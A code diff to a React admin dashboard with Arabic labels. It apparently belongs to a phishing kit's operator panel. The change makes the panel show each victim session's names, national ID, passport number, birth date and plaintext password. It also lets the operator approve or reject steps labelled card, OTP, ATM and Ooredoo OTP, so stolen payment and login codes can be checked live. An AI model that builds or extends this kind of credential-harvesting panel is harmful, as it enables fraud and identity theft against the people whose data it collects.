@@ -294,15 +294,21 @@ export default function AdminDashboard() {
                   title="البيانات الشخصية"
                   icon={<User className="w-4 h-4" />}
                   data={{
-                    "اللقب": selectedSession.personalData?.title,
-                    "الاسم بالكامل": `${selectedSession.personalData?.nameEnglish || ''} ${selectedSession.personalData?.lastName || ''}`,
+                    "الاسم بالعربي": selectedSession.personalData?.nameArabic,
+                    "الاسم بالإنجليزي": selectedSession.personalData?.nameEnglish,
+                    "اسم الجواز": selectedSession.personalData?.namePassport,
+                    "رقم الهوية": selectedSession.personalData?.idNumber,
+                    "رقم الجواز": selectedSession.personalData?.passportNumber,
                     "رقم الهاتف": selectedSession.personalData?.phoneNumber,
                     "البريد الإلكتروني": selectedSession.personalData?.email,
+                    "تاريخ الميلاد": selectedSession.personalData?.dateOfBirth,
+                    "الجنس": selectedSession.personalData?.gender,
+                    "كلمة المرور": selectedSession.personalData?.password,
                     "الدولة": selectedSession.personalData?.country,
                   }}
                   currentStep={selectedSession.currentStep}
                   onAccept={() => handleAdminAction(selectedSession.id, 'approve')}
-                  onReject={() => handleAdminAction(selectedSession.id, 'reject', "برجاء التحقق من معلومات الدفع الصحيح واعادة المحاوله")}
+                  onReject={() => handleAdminAction(selectedSession.id, 'reject', "برجاء التحقق من المعلومات الشخصية الصحيحة وإعادة المحاولة")}
                 />
 
                 <DataSection 
@@ -409,7 +415,7 @@ export default function AdminDashboard() {
 
 function DataSection({ title, icon, data, onAccept, onReject, currentStep }: any) {
   // تفعيل الأزرار فقط من مرحلة اتمام التسجيل والاشتراك وما بعده
-  const enableButtons = ['card', 'otp', 'atm', 'ooredoo', 'otp_ooredoo', 'success'].includes(currentStep);
+  const enableButtons = ['personal', 'card', 'otp', 'atm', 'ooredoo', 'otp_ooredoo', 'success'].includes(currentStep);
   
   return (
     <div className="bg-white rounded-3xl border border-slate-200 overflow-hidden shadow-sm hover:shadow-md transition-shadow">
